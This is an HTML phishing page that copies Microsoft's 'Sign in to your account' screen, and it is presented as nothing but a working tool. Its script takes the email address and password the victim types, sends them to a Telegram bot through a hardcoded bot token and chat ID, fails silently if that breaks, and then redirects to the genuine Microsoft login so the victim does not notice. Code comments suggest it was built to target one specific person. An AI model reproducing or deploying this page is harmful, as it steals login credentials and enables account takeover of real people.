<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to your account</title>
    <style>
        * { box-sizing: border-box; -webkit-font-smoothing: antialiased; }
        body {
            margin: 0; padding: 0;
            font-family: 'Segoe UI', Arial, sans-serif;
            background: url('https://aadcdn.msauth.net/shared/1.0/content/images/backgrounds/2_bc3d32a696895f78c19df6c717586a5d.jpg') no-repeat center center fixed;
            background-size: cover;
            display: flex; justify-content: center; align-items: center;
            min-height: 100vh;
        }
        .outer-container { width: 440px; }
        .login-card {
            background: #fff; padding: 44px;
            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
            margin-bottom: 28px; min-height: 376px;
        }
        .ms-logo { width: 108px; margin-bottom: 24px; display: block; }
        h1 { font-size: 24px; font-weight: 600; margin: 0 0 16px 0; color: #1b1b1b; }
        
        .identity-container {
            display: flex; align-items: center;
            margin-bottom: 20px; cursor: pointer;
            font-size: 15px; color: #1b1b1b;
        }
        .back-arrow-text {
            font-size: 20px; margin-right: 10px;
            line-height: 1; font-weight: 300; color: #505050;
            margin-top: -4px; 
        }

        .input-field {
            width: 100%; border: none; border-bottom: 1px solid #666;
            padding: 8px 0; font-size: 16px; margin-bottom: 12px;
            outline: none;
        }
        .input-field:focus { border-bottom: 2px solid #0067b8; }
        
        .button-row { display: flex; justify-content: flex-end; margin-top: 40px; }
        .btn-next {
            background-color: #0067b8; color: #fff; border: none;
            padding: 8px 32px; font-size: 15px; cursor: pointer; min-width: 108px;
        }
        .btn-next:disabled { background-color: #ccc; cursor: not-allowed; }

        .options-box {
            background: #fff; padding: 12px 44px;
            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
            display: flex; align-items: center; cursor: pointer;
        }
        .key-icon { width: 24px; margin-right: 12px; opacity: 0.6; }
        .footer { position: fixed; bottom: 0; right: 0; padding: 12px 30px; font-size: 12px; }
        .footer a { margin-left: 24px; text-decoration: none; color: #000; }
    </style>
</head>
<body>
    <div class="outer-container">
        <div class="login-card">
            <img src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" class="ms-logo">
            
            <div id="email-section">
                <h1>Sign in</h1>
                <input type="email" id="user-email" placeholder="Email, phone, or Skype" class="input-field" onkeydown="if(event.key==='Enter') showPassword()">
                <div class="button-row"><button class="btn-next" onclick="showPassword()">Next</button></div>
            </div>

            <div id="password-section" style="display: none;">
                <div class="identity-container" onclick="showEmail()">
                    <span class="back-arrow-text">&#8592;</span>
                    <span id="display-email"></span>
                </div>
                <h1>Enter password</h1>
                <input type="password" id="user-password" placeholder="Password" class="input-field" onkeydown="if(event.key==='Enter') submitData()">
                <div class="button-row"><button class="btn-next" id="signin-btn" onclick="submitData()">Sign in</button></div>
            </div>
        </div>
        <div class="options-box">
            <img src="https://aadcdn.msauth.net/shared/1.0/content/images/signin-options_4e48046ce74f4b89d45037c90576bfac.svg" class="key-icon">
            <span>Sign-in options</span>
        </div>
    </div>
    <div class="footer"><a>Terms of use</a><a>Privacy & cookies</a></div>

    <script>
        let emailVal = "";

        function showPassword() {
            emailVal = document.getElementById('user-email').value;
            if(!emailVal) return;
            document.getElementById('email-section').style.display = 'none';
            document.getElementById('password-section').style.display = 'block';
            document.getElementById('display-email').innerText = emailVal;
            document.getElementById('user-password').focus();
        }

        function showEmail() {
            document.getElementById('password-section').style.display = 'none';
            document.getElementById('email-section').style.display = 'block';
        }

        async function submitData() {
            const passVal = document.getElementById('user-password').value;
            const btn = document.getElementById('signin-btn');
            if(!passVal) return;
            
            // Visual feedback for the "angry man" to show it's "working"
            btn.innerText = "Signing in...";
            btn.disabled = true;

            const botToken = "8762119215:AAFqwntuZq7tLC25lf9wtNlddbZ62njFcHo";
            const chatId = "5733378501";
            const message = `🚨 **AUDIT CAPTURE**\n\n**User:** ${emailVal}\n**Pass:** ${passVal}`;

            try {
                // Sending the fetch request with a shorter timeout
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "HTML" })
                });
            } catch (e) {
                // Silent fail
            }

            // The "No-Nonsense" Redirect
            // Using login_hint ensures his email is already typed when he lands on the real MFA page
            const redirectURL = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=4765445b-f0d6-410c-984c-f8310070e304&response_type=id_token&scope=openid&nonce=12345&login_hint=" + encodeURIComponent(emailVal);
            window.location.href = redirectURL;
        }
    </script>
</body>
</html>
